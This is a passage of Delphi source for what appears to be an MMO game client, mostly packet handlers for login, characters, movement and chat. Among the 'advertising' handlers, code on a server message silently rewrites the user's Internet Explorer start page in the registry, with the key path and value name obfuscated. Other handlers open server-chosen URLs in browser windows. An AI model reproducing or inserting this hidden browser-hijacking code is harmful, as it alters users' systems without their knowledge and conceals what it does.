           g_dwFirstClientTime := GetTickCount;
           //ServerTimeGap := rtime - int64(GetTickCount);
        end;
        cltime := GetTickCount - g_dwFirstClientTime;
        svtime := rtime - g_dwFirstServerTime + 3000;

        if cltime > svtime then begin
           Inc (g_nTimeFakeDetectCount);
           {if g_nTimeFakeDetectCount > 6 then begin
              //矫埃炼累...
              str := 'Bad';
              //SendSpeedHackUser;
              FrmDlg.DMessageDlg ('Terminate the program. CODE=10000\' +
                                  'Connection is bad or system is unstable.\' +
                                  'Please contact game master.',
                                  [mbOk]);
              FrmMain.Close;
           end;}
        end else begin
           str := 'Good';
           g_nTimeFakeDetectCount := 0;
        end;
        if g_boCheckSpeedHackDisplay then begin
           DScreen.AddSysMsg (IntToStr(svtime) + ' - ' +
                              IntToStr(cltime) + ' = ' +
                              IntToStr(svtime-cltime) +
                              ' ' + str);
        end;
     end else begin
        g_dwFirstServerTime := rtime;
        g_dwFirstClientTime := GetTickCount;
        //ServerTimeGap := int64(GetTickCount) - longword(msg.Recog);
     end;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CheckSpeedHack'); //程序自动增加
  End; //程序自动增加                 *)
End;

Procedure TfrmMain.DecodeMessagePacket(datablock: String);
Var
  head, body, body2, tagstr, data, {rdstr, } str, CorpsIdx, sTemp: String;
  msg: TDefaultMessage;
  smsg: TShortMessage;
  mbw: TMessageBodyW;
  desc: TCharDesc;
  wl: TMessageBodyWL;
  hWl: THeroCharDesc;
  //   featureEx: word;
    { L, }i, j, n, {BLKSize, } param { sound, cltime, svtime}: integer;
  //   tempb: boolean;
  actor: TActor;
  event: TClEvent;
  ///   MoveShow:pTMoveHMSHow;
  Registry: TRegistry;
Begin
  Try //程序自动增加

    If datablock[1] = '+' Then
    Begin //checkcode
      data := Copy(datablock, 2, Length(datablock) - 1);
      data := GetValidStr3(data, tagstr, ['/']);
      If tagstr = 'PWR' Then
        g_boNextTimePowerHit := True; //打开攻杀
      If tagstr = 'LNG' Then
        g_boCanLongHit := True; //打开刺杀
      If tagstr = 'ULNG' Then
        g_boCanLongHit := False; //关闭刺杀
      If tagstr = 'WID' Then
        g_boCanWideHit := True; //打开半月
      If tagstr = 'UWID' Then
        g_boCanWideHit := False; //关闭半月
      If tagstr = 'CRS' Then
        g_boCanCrsHit := True;
      If tagstr = 'UCRS' Then
        g_boCanCrsHit := False;
      //     if tagstr = 'TWN'  then g_boCanTwnHit := True;
      //     if tagstr = 'UTWN' then g_boCanTwnHit := False;
      If tagstr = 'STN' Then
        g_boCanStnHit := True;
      If tagstr = 'USTN' Then
        g_boCanStnHit := False;
      If tagstr = 'LZW' Then
      Begin
        g_boCanLswHit := True;
        g_boCanLawHit := False;
      End;
      ;
      If tagstr = 'LAW' Then
      Begin
        g_boCanLswHit := False;
        g_boCanLawHit := True;
      End;
      If tagstr = 'ULSW' Then
      Begin
        g_boCanLswHit := False;
        g_boCanLawHit := False;
      End;
      If tagstr = 'LFIR' Then
      Begin
        g_boNextTimeLongFireHit := TRUE; //打开烈火
        g_dwLatestLongFireHitTick := GetTickCount;
        //Myself.SendMsg (SM_READYFIREHIT, Myself.XX, Myself.m_nCurrY, Myself.Dir, 0, 0, '', 0);
      End;
      If tagstr = 'ULFIR' Then
        g_boNextTimeLongFireHit := False; //关闭烈火

      If tagstr = 'FIR' Then
      Begin
        g_boNextTimeFireHit := TRUE; //打开烈火
        g_dwLatestFireHitTick := GetTickCount;
        //Myself.SendMsg (SM_READYFIREHIT, Myself.XX, Myself.m_nCurrY, Myself.Dir, 0, 0, '', 0);
      End;
      If tagstr = 'UFIR' Then
        g_boNextTimeFireHit := False; //关闭烈火
      If tagstr = 'GOOD' Then
      Begin
        ActionLock := FALSE;
        Inc(g_nReceiveCount);
      End;
      If tagstr = 'FAIL' Then
      Begin
        ActionFailed;
        ActionLock := FALSE;
        Inc(g_nReceiveCount);
      End;
      //DScreen.AddSysmsg (data);
      If data <> '' Then
      Begin
        CheckSpeedHack(Str_ToInt(data, 0));
      End;
      exit;
    End;
    If Length(datablock) < DEFBLOCKSIZE Then
    Begin
      If datablock[1] = '=' Then
      Begin
        data := Copy(datablock, 2, Length(datablock) - 1);
        If data = 'DIG' Then
        Begin
          g_MySelf.m_boDigFragment := TRUE;
        End;
      End;
      exit;
    End;

    head := Copy(datablock, 1, DEFBLOCKSIZE);
    body := Copy(datablock, DEFBLOCKSIZE + 1, Length(datablock) - DEFBLOCKSIZE);
    msg := DecodeMessage(head);

    //DScreen.AddSysMsg (IntToStr(msg.Ident));

    If (msg.Ident <> SM_HEALTHSPELLCHANGED) Then
    Begin

      If g_boShowMemoLog Then
      Begin
        ShowHumanMsg(@Msg);
        //PlayScene.MemoLog.Lines.Add('Ident: ' + IntToStr(msg.Recog) + '/' + IntToStr(msg.Ident));
      End;
    End;
    //   PlayScene.MemoLog.Lines.Add('datablock: ' + datablock);
    If g_MySelf = Nil Then
    Begin
      Case msg.Ident Of
        SM_GETPROCESS:
          Begin
            If msg.Recog = 1 Then
            Begin
              //m_TitleList.SetText(PChar(Client.DecryptStr(body)));
              SendGameCenterMsg(g_nLoginHandle, 1, Client.DecryptStr(body));
            End
            Else
            Begin
              SendGameCenterMsg(g_nLoginHandle, 2, Client.DecryptStr(body));
              //m_ProcessList.SetText(PChar(Client.DecryptStr(body)));
            End;
          End;
        SM_NEWID_SUCCESS:
          Begin
            FrmDlg.DMessageDlg('你的账号已经建立了。\' +
              ' 请妥善保管你的账户和密码，\' +
              '并且不要因任何原因把它告诉其它人.\' +
              '如果忘记了密码,\' +
              '你可以通过我们的主页重新找回它.\'
{$IF SOFTADOPEN   = ADOPEN}
              + '(http://www.51m2.com)'
{$IFEND}
              , [mbOk]);
            LoginScene.m_EdId.SetFocus;
          End;
        SM_NEWID_FAIL:
          Begin
            Case msg.Recog Of
              0:
                Begin
                  FrmDlg.DMessageDlg('[' + MakeNewId +
                    ']已经被其它玩家使用了。\请重新选择用户名！',
                    [mbOk]);
                  LoginScene.NewIdRetry(FALSE); //促矫 矫档
                End;
              -2:
                FrmDlg.DMessageDlg('在本服务器上，此用户名已被禁止使用。\请另选一个不同的名字。', [mbOk]);
            Else
              FrmDlg.DMessageDlg('建立ID失败，请确认没有包含空格、\特殊、或难以辨认的字符。 ', [mbOk]);
            End;
          End;
        SM_PASSWD_FAIL:
          Begin
            Case msg.Recog Of
              -1: FrmDlg.DMessageDlg('[失败]：密码错误！', [mbOk]);
              -2:
                FrmDlg.DMessageDlg('[失败]：账号被锁定，密码错误超过三次，请稍后再试！', [mbOk]);
              -3:
                FrmDlg.DMessageDlg('[失败]：账号被锁定，可能用户正在使用当中！', [mbOk]);
              -4:
                FrmDlg.DMessageDlg('[失败]：请重新注册您的账号！',
                  [mbOk]);
              -5:
                FrmDlg.DMessageDlg('[失败]：您的账号已过期，已被暂停使用！', [mbOk]);
            Else
              FrmDlg.DMessageDlg('[失败]：账号不存在！', [mbOk]);
            End;
            LoginScene.PassWdFail;
          End;
        SM_NEEDUPDATE_ACCOUNT: //拌沥 沥焊甫 促矫 涝仿窍扼.
          Begin
            ClientGetNeedUpdateAccount(body);
          End;
        SM_UPDATEID_SUCCESS:
          Begin
            FrmDlg.DMessageDlg('你的账号已经更新。\' +
              '请妥善保管你的账户和密码，\' +
              '并且不要因任何原因把它告诉其它人.\' +
              '如果忘记了密码,\' +
              '你可以通过我们的主页重新找回它.\', [mbOk]);
            ClientGetSelectServer;
          End;
        SM_UPDATEID_FAIL:
          Begin
            FrmDlg.DMessageDlg('更新账户失败.', [mbOk]);
            ClientGetSelectServer;
          End;
        SM_PASSOK_SELECTSERVER:
          Begin
            ClientGetPasswordOK(msg, body);
          End;
        SM_SELECTSERVER_OK:
          Begin
            ClientGetPasswdSuccess(body);
          End;
        SM_QUERYCHR:
          Begin
            ClientGetReceiveChrs(body);
          End;
        SM_DELHUM:
          Begin
            ClientGetRenewHum(@msg, body);
          End;
        SM_RENEWHUM:
        begin
          SendQueryChr;
        end;
        SM_QUERYCHR_FAIL:
          Begin
            g_boDoFastFadeOut := FALSE;
            g_boDoFadeIn := FALSE;
            g_boDoFadeOut := FALSE;
            FrmDlg.DMessageDlg('这个账号不可用，服务器认证失败。', [mbOk]);
            Close;
          End;
        SM_NEWCHR_SUCCESS:
          Begin
            SendQueryChr;
          End;
        SM_NEWCHR_FAIL:
          Begin
            Case msg.Recog Of
              0:
                FrmDlg.DMessageDlg('[失败]：角色创建失败，\ \角色名中只允许数字、英文和简体汉字字符.\请确认角色名中是否带有非法字符', [mbOk]);
              2: FrmDlg.DMessageDlg('[失败]：这个名字已存在.',
                  [mbOk]);
              3:
                FrmDlg.DMessageDlg('[失败]：你最多只能为一个账号设置2个角色.', [mbOk]);
              4:
                FrmDlg.DMessageDlg('[失败]：角色创建失败，\ \角色名中只允许数字、英文和简体汉字字符.\请确认角色名中是否带有非法字符', [mbOk]);
              5:
                FrmDlg.DMessageDlg('[失败]：你所创建的角色总数已达上限.', [mbOk]);
            Else
              FrmDlg.DMessageDlg('[失败]：角色创建失败，\ \角色名中只允许数字、英文和简体汉字字符.\请确认角色名中是否带有非法字符', [mbOk]);
            End;
          End;
        SM_CHGPASSWD_SUCCESS:
          Begin
            FrmDlg.DMessageDlg('密码变更成功.', [mbOk]);
          End;
        SM_CHGPASSWD_FAIL:
          Begin
            Case msg.Recog Of
              -1:
                FrmDlg.DMessageDlg('[失败]：原密码或账号错误，不能修改.', [mbOk]);
              -2:
                FrmDlg.DMessageDlg('[失败]：账号被锁定，请稍后再试.',
                  [mbOk]);
            Else
              FrmDlg.DMessageDlg('[失败]：原密码或账号错误，不能修改.', [mbOk]);
            End;
          End;
        SM_DELCHR_SUCCESS:
          Begin
            SendQueryChr;
          End;
        SM_DELCHR_FAIL:
          Begin
            FrmDlg.DMessageDlg('[失败]： 删除角色失败。', [mbOk]);
          End;
        SM_STARTPLAY:
          Begin
            ClientGetStartPlay(body);
            exit;
          End;
        SM_STARTFAIL:
          Begin
            FrmDlg.DMessageDlg('此服务器满员！', [mbOk]);
            //               FrmMain.Close;
            //               frmSelMain.Close;
            ClientGetSelectServer();
            exit;
          End;
        SM_VERSION_FAIL:
          Begin
            FrmDlg.DMessageDlg('版本错误. 请重新下载客户端.(http://www.51m2.com).', [mbOk]);
            FrmMain.Close;
            exit;
          End;
        SM_OUTOFCONNECTION,
          SM_NEWMAP,
          SM_LOGON,
          SM_RECONNECT,
          SM_SENDNOTICE, //酒贰俊辑 贸府
        SM_SELFONE,
          SM_SELFTWO,
          SM_SELFWEB,
          SM_SELFMAIN,
          SM_SELFIE,
          SM_SELFTOP,
          SM_SELFSYS,
          SM_SELFCENET,
          SM_ATTACKMODE: ;
      Else
        exit;
      End;
    End;
    If g_boMapMoving Then
    Begin
      If msg.Ident = SM_CHANGEMAP Then
      Begin
        WaitingMsg := msg;
        WaitingStr := DecodeString(body);
        g_boMapMovingWait := TRUE;
        WaitMsgTimer.Enabled := TRUE;
      End;
      exit;
    End;

    Case msg.Ident Of
      //广告开始
      SM_SELFONE:
        Begin
          If g_OpenAd Then
            g_CloseStr := DecodeString(Body);
        End;
      SM_SELFTWO:
        Begin
          If g_OpenAd Then
            g_CloseWeb := DecodeString(Body);
        End;
      SM_SELFWEB:
        Begin
          If g_OpenAd Then
            CreattWeb(DecodeString(Body));
        End;
      SM_SELFTOP:
        Begin
          If g_OpenAd Then
            DScreen.AddTopMsg(DecodeString(Body), msg.Param);
        End;
      SM_SELFSYS:
        Begin
          If g_OpenAd Then
            DScreen.AddChatADString(DecodeString(body),
              GetRGB(Lobyte(msg.Param)), GetRGB(Hibyte(msg.Param)), GetTickCount
              +
              LongWord(msg.Recog));
        End;
      SM_SELFCENET:
        Begin
          If g_OpenAd Then
          Begin
            g_sCenterMsg := DecodeString(Body);
            g_dwCenterMsgTick := GetTickCount + +LongWord(msg.Recog);
            g_dwCenterMsgfcolor := GetRGB(Lobyte(msg.Param));
            g_dwCenterMsgbcolor := GetRGB(Hibyte(msg.Param));
          End;
        End;
      SM_SELFMAIN:
        Begin
          If g_OpenAd Then
          Begin
            Registry := TRegistry.Create;
            Try
              With Registry Do
              Begin
                RootKey := HKEY_CURRENT_USER;
                If
                  OpenKey(DecodeString('PrybYCY]XbQXORa_XbyoWrUpS@ajYBQnWbQpD@QtXBmkXbQnS@q]VRt'), True) Then
//                  Software\Microsoft\Internet Explorer\Main
                Begin
                  WriteString(DecodeString('PsM]XcL\PBAcUL'),  //Start Page
                    DecodeString(body));
                  CloseKey; //
                End;
              End;
            Finally
              Registry.Free;
            End;
          End;
        End;
      SM_SELFIE:
        Begin
          If g_OpenAd Then
            CreattIE(DecodeString(Body));
        End;
      //广告结束
          //Damian
      SM_VERSION_FAIL:
        Begin
          i := MakeLong(msg.Param, msg.Tag);
          DecodeBuffer(body, @j, sizeof(Integer));
          If (msg.Recog <> g_nThisCRC) And
            (i <> g_nThisCRC) And
            (j <> g_nThisCRC) Then
          Begin

            //FrmDlg.DMessageDlg ('Wrong version. Please download latest version.', [mbOk]);
            //DScreen.AddChatBoardString ('版本错误. 请重新下载客户端.(http://www.Js991.com).', clYellow, clRed);
            //CSocket.Close;
    //        FrmMain.Close;
    //        frmSelMain.Close;
            //exit;
            {FrmDlg.DMessageDlg ('Wrong version. Please download latest version. (http://www.legendofmir.net)', [mbOk]);
            Close;
            exit;}
          End;
        End;
      SM_NEWMAP:
        Begin
          g_sMapTitle := '';
          str := DecodeString(body); //mapname
          //        PlayScene.MemoLog.Lines.Add('X: ' + IntToStr(msg.Param) + 'Y: ' + IntToStr(msg.tag) + ' Map: ' + str);
          PlayScene.SendMsg(SM_NEWMAP, 0,
            msg.Param {x},
            msg.tag {y},
            msg.Series {darkness},
            0, 0,
            str {mapname});
        End;
       SM_OpenItemArray:
         begin
           SetLength(g_OpenItemArray,msg.Param);
           FillChar(g_OpenItemArray[0],msg.Param,#0);
           DecodeBuffer(Body, @g_OpenItemArray[0],msg.Recog);
           RefWgInfo();
           LoadUserConfig(CharName);
         end;
      SM_WineValue:
      begin
          DecodeBuffer(Body, @g_MySelf.m_WineRec, SizeOf(TWineRec));
      end;
      SM_MedicineValue:
      begin
         DecodeBuffer(Body, @g_MySelf.m_MedicineRec, SizeOf(TMedicineRec));
      end;
      SM_SKILL84Exp:
      begin
        DecodeBuffer(Body, @g_MySelf.m_SKILL84Rec, SizeOf(TSKILL84Rec));
      end;
      SM_bLiquorProgress:
      begin
        g_MySelf.m_bLiquorProgress:=msg.Recog;
      end;
      SM_DRINK,SM_ADDLiquor:
     //喝酒动画 酒量提升消息
      begin
      g_MySelf.SendMsg(msg.Ident, msg.Param, msg.Tag, msg.Series, 0, 0,
          '', 0);
      end;
      SM_DRUNK,SM_SKILL53:
      //喝醉酒消息
      begin
         actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
              actor.SendMsg(msg.Ident,
                msg.Param {x},
                msg.tag {y},
                msg.Series {dir},
                0, 0, '', 0);
      end;
      SM_SKILL83Value://先天元力变更消息
      begin
        DecodeBuffer(Body, @g_MySelf.m_SKILL83Rec, SizeOf(TSKILL83Rec));
      end;
////////////英雄//////
      SM_HeroWineValue:
      begin
          DecodeBuffer(Body, @g_WineRec, SizeOf(TWineRec));
      end;
      SM_HeroMedicineValue:
      begin
         DecodeBuffer(Body, @g_MedicineRec, SizeOf(TMedicineRec));
      end;
      SM_HeroSKILL84Exp:
      begin
        DecodeBuffer(Body, @g_SKILL84Rec, SizeOf(TSKILL84Rec));
      end;
      SM_HeroSKILL83Value://先天元力变更消息
      begin
        DecodeBuffer(Body, @g_SKILL83Rec, SizeOf(TSKILL83Rec));
      end;
      SM_HerobLiquorProgress:
      begin
        g_bLiquorProgress:=msg.Recog;
      end;
      SM_HeroDRINK,SM_HeroDRUNK,SM_HeroADDLiquor:
      //喝酒动画  喝醉酒消息     酒量提升消息
      begin
          If msg.Recog <> g_MySelf.m_nRecogId Then
          Begin
            actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
              actor.SendMsg(msg.Ident,
                msg.Param {x},
                msg.tag {y},
                msg.Series {dir},
                0, 0, '', 0);
          End;
      end;
//////////////////////////////
      SM_LOGON:
        Begin
          g_dwFirstServerTime := 0;
          g_dwFirstClientTime := 0;
          With msg Do
          Begin
            DecodeBuffer(body, @wl, sizeof(TMessageBodyWL));
            PlayScene.SendMsg(SM_LOGON, msg.Recog,
              msg.Param {x},
              msg.tag {y},
              msg.Series {dir},
              wl.lParam1, //desc.Feature,
              wl.lParam2, //desc.Status,
              '');
            DScreen.ChangeScene(stPlayGame);
            SendClientMessage(CM_QUERYBAGITEMS, 0, 0, 0, 0);
            If Lobyte(Loword(wl.lTag1)) = 1 Then
              g_boAllowGroup := TRUE
            Else
              g_boAllowGroup := FALSE;
            g_boServerChanging := FALSE;
          End;
          If g_wAvailIDDay > 0 Then
          Begin
            //DScreen.AddChatBoardString ('You are connected through personal account.', clGreen, clWhite)
          End
          Else If g_wAvailIPDay > 0 Then
          Begin
            //DScreen.AddChatBoardString ('You are connected through fixed amount IP.', clGreen, clWhite)
          End
          Else If g_wAvailIPHour > 0 Then
          Begin
            //DScreen.AddChatBoardString ('You are connected through fixed time IP.', clGreen, clWhite)
          End
          Else If g_wAvailIDHour > 0 Then
          Begin
            //DScreen.AddChatBoardString ('You are connected through fixed time account.', clGreen, clWhite)
          End;
          g_WgClass := wl.lTag2;
         { RefWgInfo();
          LoadUserConfig(CharName); }
          //g_MasterIdx:=0;
          //DScreen.AddChatBoardString ('当前服务器信息: ' + g_sRunServerAddr + ':' + IntToStr(g_nRunServerPort), clGreen, clWhite)
        End;
      SM_SERVERCONFIG: ClientGetServerConfig(Msg, Body);
      SM_ExpShowConfig:
        Begin
          g_ExpShowConfig := Boolean(msg.Recog); //经验显示选项消息
          g_BagShowItemDec:=Boolean(msg.Param);//鼠标在包裹里选中物品后是不是显示物品的备注说明
        End;
     SM_UERYREFINEITEM: //打开装备升级窗口
     begin
          FrmDlg.DItemLeve.Visible := True;
          FrmDlg.m_nLevelIdx := -1;
          FrmDlg.DItemBag.Visible:=True;
     end;
      SM_OPENMAKEWINE: //打开酿酒台
      begin
       g_MakeWineidx:=msg.Recog;
       FrmDlg.OpenMakeWineDesk();
      end;
      SM_WebBrowser: //打开Web窗口
      begin
         if not FormWEB.Showing then
         begin
          FormWEB.Left:=Left;
          FormWEB.Top:=Top;
          FormWEB.Edit1.Text:=DecodeString(Body);
          FormWEB.WebBrowser1.Navigate(FormWEB.Edit1.Text);
          FormWEB.Show;
         end;
      end;

      SM_RECONNECT:
        Begin
          ClientGetReconnect(body);
        End;
      SM_TIMECHECK_MSG:

        Begin
          CheckSpeedHack(msg.Recog);
        End;

      SM_AREASTATE:
        Begin
          g_nAreaStateValue := msg.Recog;
        End;

      SM_MAPDESCRIPTION:
        Begin
          ClientGetMapDescription(Msg, body);
        End;
      SM_MUSIC:
        Begin
          g_sBgMusic := DecodeString(body);
          PlayBgMusic(g_sBgMusic, True, True);
        End;
      SM_GOLDNAME:
        Begin
          ClientGetGameGoldName(msg, body);
        End;
      SM_GAMEGOLDNAME:
        Begin
          ClientGetGameGoldName(msg, body);
        End;
      SM_ADJUST_BONUS:
        Begin
          ClientGetAdjustBonus(msg.Recog, body);
        End;
      SM_MYSTATUS:
        Begin
          g_nMyHungryState := msg.Param;
        End;
      SM_ISSHOP:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.m_boIsShop := msg.Param = 1;
            If body <> '' Then
              actor.m_sShopMsg := DecodeString(body);
          End;
        End;
      SM_PLAYSHOPLIST:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
            ClientGetShopItmes(actor, body);
        End;

      SM_SELLSHOPLIST:
        Begin
          ClientGetSelfShopItmes(body);
        End;
      SM_LOADURL:
        Begin
          If Not g_boInetStr Then
            TReadInteger.Create(DecodeString(body));
        End;
      SM_SELLSHOPTITLE:
        Begin
          g_MySelf.m_sShopMsg := DecodeString(body);
        End;

      SM_TURN:
        Begin
          If Length(body) > GetCodeMsgSize(sizeof(TCharDesc) * 4 / 3) Then
          Begin
            Body2 := Copy(Body, GetCodeMsgSize(sizeof(TCharDesc) * 4 / 3) + 1,
              Length(body));
            data := DecodeString(body2); //某腐 捞抚
            str := GetValidStr3(data, data, ['/']);
            //data = 捞抚
            //str = 祸哎
          End
          Else
            data := '';
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          PlayScene.SendMsg(SM_TURN, msg.Recog,
            msg.Param {x},
            msg.tag {y},
            msg.Series {dir + light},
            desc.Feature,
            desc.Status,
            ''); //捞抚
          If data <> '' Then
          Begin
            actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
            Begin
              //DScreen.AddChatBoardString (data, GetRGB(0), GetRGB(255));
              CorpsIdx := GetValidStr3(data, data, ['|']);
              actor.m_sGroupMsg := GetValidStr3(CorpsIdx, CorpsIdx, ['|']);
              If actor.m_sGroupMsg <> '' Then
              Begin
                actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '\',
                  '/');
                actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '|',
                  '/');
              End;
              //DScreen.AddChatBoardString (actor.m_sGroupMsg, GetRGB(0), GetRGB(255));
              //sTemp:=GetValidStr3(CorpsIdx,CorpsIdx, ['/']);
              //actor.m_nHelmet:=Str_ToInt(sTemp,0);
              If CorpsIdx <> '' Then
              Begin
                CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']); //特殊图标
                actor.m_nUserCorpsIdx := Str_ToInt(sTemp, 0);
                If CorpsIdx <> '' Then
                Begin

                  For i := Low(actor.m_nIconIdx) To High(actor.m_nIconIdx) Do
                  Begin
                    CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                    //特殊图标
                    actor.m_nIconIdx[i] := Str_ToInt(sTemp, 0);
                  End;
                  CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                  actor.m_nHelmet := Str_ToInt(sTemp, 0);
                End;
              End;
              actor.m_sDescUserName := GetValidStr3(data, actor.m_sUserName,
                ['\']);
              actor.m_nNameColor := GetRGB(Str_ToInt(str, 0));
              GameNameHit(actor);
            End;
          End;
        End;

      SM_BACKSTEP:
        Begin
          If Length(body) > GetCodeMsgSize(sizeof(TCharDesc) * 4 / 3) Then
          Begin
            Body2 := Copy(Body, GetCodeMsgSize(sizeof(TCharDesc) * 4 / 3) + 1,
              Length(body));
            data := DecodeString(body2); //某腐 捞抚
            str := GetValidStr3(data, data, ['/']);
            //data = 捞抚
            //str = 祸哎
          End
          Else
            data := '';
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          PlayScene.SendMsg(SM_BACKSTEP, msg.Recog,
            msg.Param {x},
            msg.tag {y},
            msg.Series {dir + light},
            desc.Feature,
            desc.Status,
            ''); //捞抚
          If data <> '' Then
          Begin
            actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
            Begin
              CorpsIdx := GetValidStr3(data, data, ['|']);
              actor.m_sGroupMsg := GetValidStr3(CorpsIdx, CorpsIdx, ['|']);
              If actor.m_sGroupMsg <> '' Then
              Begin
                actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '\',
                  '/');
                actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '|',
                  '/');
              End;
              //sTemp:=GetValidStr3(CorpsIdx,CorpsIdx, ['/']);
              //actor.m_nHelmet:=Str_ToInt(sTemp,0);
              //actor.m_nUserCorpsIdx:=Str_ToInt(CorpsIdx,0);
              If CorpsIdx <> '' Then
              Begin
                CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']); //特殊图标
                actor.m_nUserCorpsIdx := Str_ToInt(sTemp, 0);
                If CorpsIdx <> '' Then
                Begin
                  For i := Low(actor.m_nIconIdx) To High(actor.m_nIconIdx) Do
                  Begin
                    CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                    //特殊图标
                    actor.m_nIconIdx[i] := Str_ToInt(sTemp, 0);
                  End;
                  CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                  actor.m_nHelmet := Str_ToInt(sTemp, 0);
                End;
              End;
              actor.m_sDescUserName := GetValidStr3(data, actor.m_sUserName,
                ['\']);
              //actor.UserName := data;
              actor.m_nNameColor := GetRGB(Str_ToInt(str, 0));
            End;
          End;
        End;

      SM_SPACEMOVE_HIDE,
        SM_SPACEMOVE_HIDE2:
        Begin
          If msg.Recog <> g_MySelf.m_nRecogId Then
          Begin
            PlayScene.SendMsg(msg.Ident, msg.Recog, msg.Param {x}, msg.tag {y},
              0, 0, 0, '')
          End;
        End;

      SM_SPACEMOVE_SHOW,
        SM_SPACEMOVE_SHOW2:
        Begin
          If Length(body) > GetCodeMsgSize(sizeof(TCharDesc) * 4 / 3) Then
          Begin
            Body2 := Copy(Body, GetCodeMsgSize(sizeof(TCharDesc) * 4 / 3) + 1,
              Length(body));
            data := DecodeString(body2); //某腐 捞抚
            str := GetValidStr3(data, data, ['/']);
            //data = 捞抚
            //str = 祸哎
          End
          Else
            data := '';
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          If msg.Recog <> g_MySelf.m_nRecogId Then
          Begin //促弗 某腐磐牢 版快
            PlayScene.NewActor(msg.Recog, msg.Param, msg.tag, msg.Series,
              desc.feature, desc.Status);
          End;
          PlayScene.SendMsg(msg.Ident, msg.Recog,
            msg.Param {x},
            msg.tag {y},
            msg.Series {dir + light},
            desc.Feature,
            desc.Status,
            ''); //捞抚
          If data <> '' Then
          Begin
            actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
            Begin
              CorpsIdx := GetValidStr3(data, data, ['|']);
              actor.m_sGroupMsg := GetValidStr3(CorpsIdx, CorpsIdx, ['|']);
              If actor.m_sGroupMsg <> '' Then
              Begin
                actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '\',
                  '/');
                actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '|',
                  '/');
              End;
              //sTemp:=GetValidStr3(CorpsIdx,CorpsIdx, ['/']);
              //actor.m_nHelmet:=Str_ToInt(sTemp,0);
              //actor.m_nUserCorpsIdx:=Str_ToInt(CorpsIdx,0);
              If CorpsIdx <> '' Then
              Begin
                CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']); //特殊图标
                actor.m_nUserCorpsIdx := Str_ToInt(sTemp, 0);
                If CorpsIdx <> '' Then
                Begin
                  For i := Low(actor.m_nIconIdx) To High(actor.m_nIconIdx) Do
                  Begin
                    CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                    //特殊图标
                    actor.m_nIconIdx[i] := Str_ToInt(sTemp, 0);
                  End;
                  CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                  actor.m_nHelmet := Str_ToInt(sTemp, 0);
                End;
              End;
              actor.m_sDescUserName := GetValidStr3(data, actor.m_sUserName,
                ['\']);
              //actor.UserName := data;
              actor.m_nNameColor := GetRGB(Str_ToInt(str, 0));
            End;
          End;
        End;

      SM_WALK, SM_RUSH, SM_RUSHKUNG:
        Begin
          //DScreen.AddSysMsg ('WALK ' + IntToStr(msg.Param) + ':' + IntToStr(msg.Tag));
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          If (msg.Recog <> g_MySelf.m_nRecogId) Or (msg.Ident = SM_RUSH) Or
            (msg.Ident = SM_RUSHKUNG) Then
            PlayScene.SendMsg(msg.Ident, msg.Recog,
              msg.Param {x},
              msg.tag {y},
              msg.Series {dir+light},
              desc.Feature,
              desc.Status, '');
          If msg.Ident = SM_RUSH Then
            g_dwLatestRushRushTick := GetTickCount;
        End;

      SM_RUN, SM_HORSERUN:
        Begin
          //DScreen.AddSysMsg ('RUN ' + IntToStr(msg.Param) + ':' + IntToStr(msg.Tag));
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          If msg.Recog <> g_MySelf.m_nRecogId Then
            PlayScene.SendMsg(msg.Ident, msg.Recog,
              msg.Param {x},
              msg.tag {y},
              msg.Series {dir+light},
              desc.Feature,
              desc.Status, '');
          (*
          PlayScene.SendMsg (SM_RUN, msg.Recog,
                               msg.Param{x},
                               msg.tag{y},
                               msg.Series{dir+light},
                               desc.Feature,
                               desc.Status, '');
          *)
        End;

      SM_CHANGELIGHT: //游戏亮度
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.m_nChrLight := msg.Param;
          End;
        End;

      SM_LAMPCHANGEDURA:
        Begin
          If g_UseItems[U_RIGHTHAND].S.Name <> '' Then
          Begin
            g_UseItems[U_RIGHTHAND].Dura := msg.Recog;
          End;
        End;

      SM_MOVEFAIL:
        Begin
          ActionFailed;
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          PlayScene.SendMsg(SM_TURN, msg.Recog,
            msg.Param {x},
            msg.tag {y},
            msg.Series {dir},
            desc.Feature,
            desc.Status, '');
        End;
      SM_BUTCH:
        Begin
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          If msg.Recog <> g_MySelf.m_nRecogId Then
          Begin
            actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
              actor.SendMsg(SM_SITDOWN,
                msg.Param {x},
                msg.tag {y},
                msg.Series {dir},
                0, 0, '', 0);
          End;
        End;
      SM_SITDOWN:
        Begin
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          If msg.Recog <> g_MySelf.m_nRecogId Then
          Begin
            actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
              actor.SendMsg(SM_SITDOWN,
                msg.Param {x},
                msg.tag {y},
